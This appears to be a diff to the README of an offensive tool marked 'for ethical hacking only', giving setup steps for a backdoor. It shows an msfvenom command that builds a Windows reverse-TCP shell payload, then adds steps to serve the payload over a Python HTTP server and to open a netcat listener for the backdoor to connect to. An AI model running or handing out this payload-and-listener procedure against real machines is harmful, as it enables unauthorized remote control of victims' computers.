@@ -16,3 +16,10 @@ Use this for ethical hacking only
     msfvenom -p windows/x64/shell_reverse_tcp lhost="Host IP" lport="Host Port" -f raw > load.bin
     
     
+4- Setup the http webserver for Payload download (while in cybersecurity folder)
+
+    python -m http.server
+    
+5- Open the listner for the backdoor to connect to (using netcat)
+
+    nc -lvvnp
